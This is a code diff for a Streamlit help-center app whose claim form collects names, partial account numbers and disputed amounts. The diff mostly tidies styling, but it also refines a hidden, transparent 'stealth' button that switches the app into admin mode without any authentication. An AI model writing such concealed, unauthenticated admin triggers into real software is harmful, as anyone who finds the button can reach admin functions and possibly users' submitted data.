@@ -42,13 +42,13 @@ st.markdown("""<style>
 
     /* REFINED RESPONSIVE LOGO */
     [data-testid="stImage"] img {
-        width: 280px !important; /* Larger for Desktop */
+        width: 280px !important;
         height: auto !important;
     }
 
     @media (max-width: 768px) {
         [data-testid="stImage"] img {
-            width: 130px !important; /* Smaller for Mobile */
+            width: 130px !important;
         }
     }
 
@@ -67,13 +67,14 @@ st.markdown("""<style>
         position: relative;
     }
 
+    /* STEALTH TRIGGER - DESKTOP ONLY */
     .stealth-trigger {
         position: absolute !important;
         bottom: 0 !important; left: 0 !important;
         width: 40px !important; height: 40px !important;
         z-index: 999 !important;
     }
-    
+
     .stealth-trigger button {
         background: transparent !important;
         border: none !important;
@@ -83,8 +84,13 @@ st.markdown("""<style>
         cursor: default !important;
     }
 
+    /* HIDE COMPLETELY ON MOBILE */
     @media (max-width: 768px) {
-        .stealth-trigger { display: none !important; }
+        .stealth-trigger { 
+            display: none !important; 
+            visibility: hidden !important;
+            pointer-events: none !important;
+        }
     }
 
     .legal-container {
@@ -97,8 +103,7 @@ st.markdown("""<style>
         line-height: 1.6 !important;
         background: transparent !important;
     }
-    
-    /* Final fix for legal text glitches */
+
     .legal-container * {
         background: transparent !important;
         color: #666 !important;
@@ -118,7 +123,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_8_2", clear_on_submit=True):
+    with st.form("claim_v32_8_3", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -137,9 +142,9 @@ if not st.session_state.admin_mode:
             </a>
         </div>
     """, unsafe_allow_html=True)
-    
+
     st.markdown("<div class='stealth-trigger'>", unsafe_allow_html=True)
-    if st.button(" ", key="stealth_admin_v82"):
+    if st.button(" ", key="stealth_admin_v83"):
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div></div>", unsafe_allow_html=True)
